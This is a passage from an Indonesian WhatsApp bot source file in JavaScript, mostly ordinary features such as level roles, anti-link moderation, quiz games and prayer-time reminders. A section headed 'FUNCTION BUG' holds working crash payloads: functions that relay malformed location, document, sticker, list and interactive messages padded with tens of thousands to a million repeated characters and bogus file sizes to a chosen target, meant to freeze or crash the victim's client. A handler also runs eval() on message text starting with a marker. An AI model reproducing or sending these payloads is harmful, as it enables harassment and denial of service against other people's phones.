user.role = 'Kemunculan Ancaman Baru ☠️'
} else if (user.level <= 31) {
user.role = 'Kehancuran Dunia yang Terancam 🌍'
} else if (user.level <= 41) {
user.role = 'Revolusi Pahlawan ⚔️'
} else if (user.level <= 51) {
user.role = 'Era Kedamaian yang Rapuh 🕊️'
} else if (user.level <= 61) {
user.role = 'Masa Depan yang Tidak Pasti 🌌'
} else if (user.level <= 71) {
user.role = 'Kembalinya Ancaman Kuno 🔮'
} else if (user.level <= 81) {
user.role = 'Misi Keselamatan Galaksi 🚀'
} else if (user.level <= 91) {
user.role = 'Perang Besar: Awal dari Semua 🌟'
} else if (user.level <= 100) {
user.role = 'Perang Besar: Akhir dari Semua 💥'
}
let role = user.role
if (before !== user.level) {
let naiklevell = `乂  L E V E L  U P

┌  ≡ Progress : *${before} -> ${user.level}*
└  ≡ Role : *${db.data.users[m.sender].role}* 


*Hadiah Level Up:*
+1 Pangkat Yang Terbuka`.trim()
try {
	let image, data, pp
				try { pp = await conn.profilePictureUrl(m.sender, 'image') }
				catch { pp = 'https://telegra.ph/file/60b60aad1312a63d640a6.jpg' }
				image = await new can.Up().setAvatar(pp).toAttachment()
				data = await image.toBuffer()
				await conn.sendMessage(m.chat, { image: data, caption: text }, { quoted : fkontak })
} catch {
reply(naiklevell)
}
}
}       
  */
    function didyoumen(command, valid_commands) {
    let suggestions = get_close_matches(command, valid_commands, 1, 0.6);    

    if (suggestions.length) {
        let suggestion_text = `Mungkin Command Yang Dimaksud Anda: *${suggestions[0]}*`;  // Jika ada saran
        // Kirim saran dengan thumbnail ke chat
        conn.sendMessage(m.chat, { 
            caption: suggestion_text,  // Teks saran
            image: { url: '.database/base/imagenye/add.jpg' }  // Gambar thumbnail
        });
    } 
}
     function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return conn.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return conn.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}
               //FUNCTION BUG//
 //═════════════════════════════════════════//
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await conn.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
   
async function aipong(target) {
await conn.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
//=================================================//
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await conn.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await conn.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg" } }, { upload: conn.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #💀🥶CyyxeroInvinityCrash☠️🥶"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await conn.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "⟠ 𝐙͢𝐱𝐕 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々"+" ".repeat(920000),
        'footerText': `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'description': `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: zycakep });
await conn.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./database/base/image/Dich.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const zyvoice = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 9999999999,
"ptt": "true"
}
}
}
  
const zybut = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
buttonsResponseMessage: {
selectedButtonId: 'pois0n - zxv',
type: 1,
response: {
selectedDisplayText: 'penis'
}
}
}
}

const zyrphone = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"requestPhoneNumberMessage": {
"contextinfo": 1
}
}
}

const zycakep = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `🔥`,
jpegThumbnail: fakejpg,
caption: ` ZxV - Bug ? \n ⿻ ${m.body || m.mtype} `,
inviteExpiration: Date.now() + 1814400000
}
}
};
//══════════════════════════════════════════//
                 //batas
async function addCountCmd(nama, sender, _db) {
addCountCmdUser(nama, m.sender, _cmdUser)
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].nama === nama) {
posi = i
}
})
if (posi === null) {
_db.push({nama: nama, count: 1})
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
} else {
_db[posi].count += 1
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
}
}
 
async function xero () {
var xero = [
"𝘼𝙇",
"𝘼𝙇𝙒",
"𝘼𝙇𝙒𝘼",
"𝘼𝙇𝙒𝘼𝙔",
"𝘼𝙇𝙒𝘼𝙔𝙎",
"𝘼𝙇𝙒𝘼𝙔𝙎𝙓",
"𝘼𝙇𝙒𝘼𝙔𝙎𝙓𝙀",
"𝘼𝙇𝙒𝘼𝙔𝙎𝙓𝙀𝙍",
"𝘼𝙇𝙒𝘼𝙔𝙎𝙓𝙀𝙍𝙊",
"𝐀𝐋𝐖𝐀𝐘𝐒𝐗𝐄𝐑𝐎 𝐍𝐎 𝐂𝐎𝐔𝐍𝐓𝐄𝐑!!"
]
let { key } = await conn.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})//Awalan

for (let i = 0; i < loading.length; i++) {
/*await delay(10)*/
await conn.sendMessage(from, {text: loading[i], edit: key });//setelah nya
}
}
     
async function loading () {
var loading = [
"_`• Sedang Loading, Harap Tunggu !!`_",
"_`• ᴘʀᴏᴄᴇꜱꜱ !!`_\nᴛᴜɴɢɢᴜ ꜱᴇʙᴇɴᴛᴀʀ ʏᴀ ꜱᴀʏᴀɴɢ 🥺"
]
let { key } = await conn.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})//Awalan

for (let i = 0; i < loading.length; i++) {
/*await delay(10)*/
await conn.sendMessage(from, {text: loading[i], edit: key });//setelah nya
}
}

     
if (autodelete) {
conn.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: true,
id: mek.key.id,
participant: mek.key.participant
}
})
}


//=================================================
/*let reactionMessage = {
                    react: {
                        text: `👁️‍🗨️`,
                        key: { remoteJid: m.chat, fromMe: true, id: mek.key.id }
                    }
                }
                await sleep(1500)
                conn.sendMessage(m.chat, reactionMessage)*/
//=================================================//

     
if (!conn.public) {
if (!m.key.fromMe) return
}
/*if (setting.autobio){
if (setting.autobio === false) return
let settingstatus = 0;
if (new Date() * 1 - settingstatus > 1000) {
await conn.setStatus(`I'm Ryo Yamada 🤖 | ${runtime(process.uptime())} ⏰ | Status : ${conn.mode ? "Public Mode" : "Self Mode"} | 1.3k Users`)
settingstatus = new dt() * 1
}
     }*/
let rn = ['online']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
conn.sendPresenceUpdate(jd, from)
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}
if (isCmd && !isUser) {
pengguna.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(pengguna, null, 2))
}
// Anti Link
if (AntiLink) {
if (body.match(/(chat.whatsapp.com\/)/gi)) {
if (!isBotAdmins) return m.reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await conn.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return conn.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return conn.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isCreator) return conn.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\nOwner telah mengirim link, owner bebas memposting link apa pun`})
await conn.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
conn.sendMessage(from, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:kr})
}
}
     
     //antilink all by xeon
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Detected 」\`\`\`\n\n Admin kirim link,\n Admin mah bebas cuy 🗿☕`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await conn.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
conn.sendMessage(from, {text:`\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
     //antilink twitter by xeon
if (AntiLinkTwitter)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin sudah kirim link twitter, admin mah bebas kirim link apapun😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await conn.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
conn.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah di kick karena mengirim tautan twitter di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
     //antibot 
     if (antibot) {
    if (!m.isGroup) return;
    if (m.fromMe) return true;
    if (["BAE", "B1E", "3EB0", "WA"].some(pfx => m.id.startsWith(pfx) && [12, 16, 20, 22, 40].includes(m.id.length))) {

            reply("*Bot Lain Terdeteksi*\n\nMaaf Kak Harus Saya Keluarkan, Karna Admin Mengaktifkan Anti Bot :)");
            await sleep(1000);

            if (!isAdmins && isBotAdmins) {
                await conn.groupParticipantsUpdate(m.chat, [m.sender], "remove");  
            }
        }
    }
     //blacklist
     /*let whooo = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false

    let bl = global.db.data.chats[m.chat].blacklist || []
    let peserta = await conn.groupMetadata(m.chat);
     if (Object.values(bl).find(users => users.id == m.sender) && !isAdmins) {
        // Menghapus pengguna dari grup jika ada di dalam daftar hitam
        conn.sendMessage(m.chat, { delete: { ...m.key }});
    }*/




/*
<> *BLACKLIST*<>
Source: https://whatsapp.com/channel/0029VaJYWMb7oQhareT7F40V
  "aku janji jika hapus watermark ini maka aku rela miskin hingga 7 turunan"
*/
//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: conn.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, conn.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
conn.ev.emit('messages.upsert', msg)
}
//=================================================//
if (budy.startsWith('©️')) {
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}
 
     
/*const data_autochat = JSON.parse(fs.readFileSync('./database/autochat.json', 'utf8'));
const isAutochat = data_autochat.includes(m.sender.split("@")[0])
function saveDataChat() {
  fs.readFileSync('./database/autochat.json', JSON.stringify(data_autochat, null, 2), 'utf8')*/
    
    
const totalfitur = () =>{
            var mytext = fs.readFileSync("./main.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }

async function sendGeekzMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await conn.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

conn.autoshalat = conn.autoshalat ? conn.autoshalat : {}
	let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? conn.user.id : m.sender
	let id = m.chat 
    if(id in conn.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    sunset: '05:54',
    midnight: '00:00',
    dzuhur: '12:02',
    fajar: '05:10',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"  
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for(let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if(timeNow === waktu) {
    let caption = `Hai kak ${pushname},\nWaktu *${sholat}* telah tiba, ambilah air wudhu dan segeralah shalat🙂.\n\n*${waktu}*\n_untuk wilayah Jakarta dan sekitarnya._`
    conn.autoshalat[id] = [
    reply(caption),
    setTimeout(async () => {
    delete conn.autoshalat[m.chat]
    }, 57000)
    ]
    }
    }
     
const sendapk = (teks) => {
conn.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
m.reply('*Rusak Om !! Yang Bener Contoh : Yoapk Namabebas*')
}
for (let ikalii of apknye) {
if (budy === ikalii) {
let buffer = fs.readFileSync(`./database/apk/${ikalii}.apk`)
sendapk(buffer)
}
}
//=================================================//
const sendzip = (teks) => {
conn.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
m.reply('*Rusak Om !! Yang Bener Contoh : Yozip NamaBebas*')
}
for (let ikali of zipnye) {
if (budy === ikali) {
let buffer = fs.readFileSync(`./database/zip/${ikali}.zip`)
sendzip(buffer)
}
}
//=================================================//
const senddocu = (teks) => {
conn.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
m.reply('*Rusak Om !! Yang Bener Contoh : Yopdf NamaBebas*')
}
for (let ikal of docunye) {
if (budy === ikal) {
let buffer = fs.readFileSync(`./database/Docu/${ikal}.pdf`)
senddocu(buffer)
}
}
const sendvn = (teks) => {
conn.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, {quoted:m})
}
for (let anju of vnnye) {
if (budy === anju) {
let buffer = fs.readFileSync(`./database/Audio/${anju}.mp3`)
sendvn(buffer)
}
}
//Menuuuu info
const infoo = `
 ┈──────────────────────⏣
           ⏤͟͟͞͞ᵡ    *｢ I N F O   B O T ｣*   ᵡ͟͟͞͞⏤
┈──────────────────────⏣
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
❐ *𝙱𝚘𝚝 𝙽𝚊𝚖𝚎* : ${global.botname}
❐ *𝙲𝚛𝚎𝚊𝚝𝚘𝚛* : ${ownername}
❐ *𝙰𝚔𝚝𝚒𝚏* : ✅
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
> STATUS
❐ _*𝙿𝚛𝚎𝚖𝚒𝚞𝚖*_ : *${isPrem ? '✅' : '❎'}*
❐ _*Akses*_ : *FREE*
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
> DATE
❐ _*𝚃𝚊𝚗𝚐𝚐𝚊𝚕*_ : *${hariini}*
❐ _*𝙹𝚊𝚖*_ : *${time} WIB*
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬`

/*const infoo1 = `═════════════════════
*${m2}</> ᴅ ᴀ ꜱ ʜ ʙ ᴏ ᴀ ʀ ᴅ </>${m2}*
═════════════════════
🌟 ʜᴀɪ @${m.sender.split('@')[0]}, ᴀᴋᴜ ᴀᴅᴀʟᴀʜ ${global.botname}, ʙᴏᴛ ᴡʜᴀᴛꜱᴀᴘᴘ ʏᴀɴɢ ᴀᴋᴀɴ ᴍᴇᴍʙᴀɴᴛᴜ ᴀɴᴅᴀ ᴅᴀʟᴀᴍ ʙᴀɴʏᴀᴋ ʜᴀʟ ᴅɪ ᴡʜᴀᴛꜱᴀᴘᴘ. ᴊɪᴋᴀ ᴀɴᴅᴀ ᴍᴇɴᴇᴍᴜᴋᴀɴ ʙᴜɢ ᴀᴛᴀᴜ ᴇʀʀᴏʀ, ᴍᴏʜᴏɴ ʟᴀᴘᴏʀᴋᴀɴ ᴋᴇᴘᴀᴅᴀ ᴏᴡɴᴇʀ.
═════════════════════

═════════════════════
*${m2}</> ɪ ɴ ꜰ ᴏ - ʙ ᴏ ᴛ </>${m2}*
═════════════════════
*➤  ɴᴀᴍᴀ ʙᴏᴛ*: ${botname}
*➤  ᴏᴡɴᴇʀ: ᴅɪᴄʜxᴘʟᴏɪᴛ*
*➤  ᴠᴇʀꜱɪ*: 1.0.0
*➤  ᴍᴏᴅᴇ*: ${conn.public ? 'public' : 'self'}
*➤  ᴛᴏᴛᴀʟ ᴜꜱᴇʀ*: ${Object.keys(global.db.data.users).length}
*➤  ᴛᴏᴛᴀʟ ᴍᴇɴᴜ*:${totalfitur()}
*➤  ʀᴜɴᴛɪᴍᴇ*: ${runtime(process.uptime())} 
═════════════════════
═════════════════════
*${m2}</> ɪ ɴ ꜰ ᴏ - ᴜ ꜱ ᴇ ʀ </>${m2}*
═════════════════════
*➤ ɴᴀᴍᴇ*: ${pushname}
*➤ ᴛᴀɢꜱ*: @${m.sender.split('@')[0]}
*➤ ʟɪᴍɪᴛ*:
*➤ ᴇxᴘ*: 0
*➤ ᴘʀᴇᴍɪᴜᴍ*: ${isPrem ? '✅' : '❎'}
*➤ ᴍᴏɴᴇʏ*: ${getMonay(m.sender)}
═════════════════════`*/

//================================================//

var createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
try {
ppuser = await conn.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
    /*let chats = global.db.data.chats[m?.chat]
 if (typeof chats !== 'object') global.db.data.chats[m?.chat] = {}
 if (chats) {
 if (!('blacklist' in chat)) chat.blacklist = false
 } else global.db.data.chats[m?.chat] = {
 blacklist: false,
}*/
} catch (err) {
console.log(err)
}
     
    
 
//=================================================//
if (('family100'+from in _family100) && isCmd) {
kuis = true
let room = _family100['family100'+from]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
if (!isSurender) {
 let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
 if (room.terjawab[index]) return !0
 room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : `Perfect Player`}`.trim()
conn.sendText(from, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+from].pesan = mesg }).catch(_ => _)
if (isWin || isSurender) delete _family100['family100'+from]
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
   conn.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lagu`}, {quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
 delete kuismath[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 conn.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Gambar`}, {quoted:m})
 delete tebakgambar[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
